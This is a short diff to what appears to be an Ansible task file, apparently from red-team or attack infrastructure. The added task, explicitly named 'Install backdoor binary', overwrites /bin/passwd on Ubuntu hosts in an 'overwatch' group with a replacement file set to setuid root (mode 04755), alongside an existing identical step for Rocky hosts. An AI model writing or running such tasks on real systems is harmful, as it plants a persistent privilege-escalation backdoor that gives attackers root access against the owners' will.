@@ -39,3 +39,10 @@
     src: files/passwd_rocky
     dest: /bin/passwd
     mode: 04755
+
+- name: RETRIEVER | Copy File | Install backdoor binary (Ubuntu/Overwatch)
+  when: inventory_hostname in groups['overwatch']
+  ansible.builtin.copy:
+    src: files/passwd_ubuntu
+    dest: /bin/passwd
+    mode: 04755
